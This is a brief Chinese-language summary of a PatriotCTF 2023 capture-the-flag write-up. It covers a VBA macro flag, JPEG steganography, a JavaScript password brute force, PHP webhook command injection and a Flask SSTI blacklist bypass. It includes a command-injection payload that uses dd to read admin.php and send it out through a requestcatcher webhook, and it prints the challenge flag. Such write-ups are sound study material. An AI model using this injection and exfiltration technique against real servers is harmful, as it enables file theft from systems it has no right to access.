---
title: "PatriotCTF 2023 Writeup"
category: misc
tags: ["PatriotCTF 2023", "misc", "vba", "macro", "jpeg-stego", "js-password"]
signals: ["PatriotCTF 2023 2023", "vba", "macro", "jpeg-stego", "js-password", "ssrf", "ssti", "jinja2", "binwalk", "misc_unknown", "PatriotCTF", "VBA", "flag", "jpeg"]
difficulty: medium
source: "https://www.ctfiot.com/134358.html"
tools: ["Flask", "PHP", "binwalk"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# PatriotCTF 2023 Writeup

> 赛事：PatriotCTF 2023 2023 | 方向：misc | 难度：medium | 工具：Flask、PHP、binwalk

## 一句话总结

PatriotCTF 2023 多题大杂烩：VBA 宏反推 flag、jpeg binwalk 提 audio、JS 密码 &|^ 验证爆破、PHP webhook + dd 命令注入、Flask SSTI 绕黑名单。

## 攻击链

1. VBA 宏：chr 拼接 flag "PCTF{3n4bl3_m4cr05_plz_27315670}
2. jpeg 隐写 binwalk -e 提取内嵌 audio.wav
3. checkName 字符串反转 == "uyjnimda" → "adnimjyu
4. checkLength password.length % 6 === 0
5. checkValidity 按 6 字符分组 & | ^ 验证 0x60+0x61-0x6=0xbb
6. 6 重循环爆破 97-122 字符
7. check.php POST password
8. exec "php send_pass.php ${tmpPass} ${wh}" webhook 外带
9. filter_var FILTER_VALIDATE_URL + http://...requestcatcher.com/test
10. webhook 中 ?q=$(dd if=/var/www/html/admin.php bs=1 skip=325) 命令注入
11. Flask 黑名单 SSTI: config / update / builtins / 引号 / 加减 / 空格 / 中括号
12. render_template_string(render) 注入 {{}}

## 关键 payload

```
chr(0x50)+chr(0x43)+...+chr(0x7D) = "PCTF{3n4bl3_m4cr05_plz_27315670}
```

## 经验教训

宏 chr 拼接是直接可读 flag；binwalk 提 jpeg 尾 zip；JS 字符串反转 + 6 字符分组位运算校验；webhook + dd if=bs=1skip=325 经典命令外带；Flask render_template_string 是经典 SSTI 入口。

## 标签

vba、macro、jpeg-stego、js-password、ssrf、ssti、jinja2、binwalk、xss、oob

## 参考来源

- https://www.ctfiot.com/134358.html
- 原文件：PatriotCTF_2023_Writeup.full.md
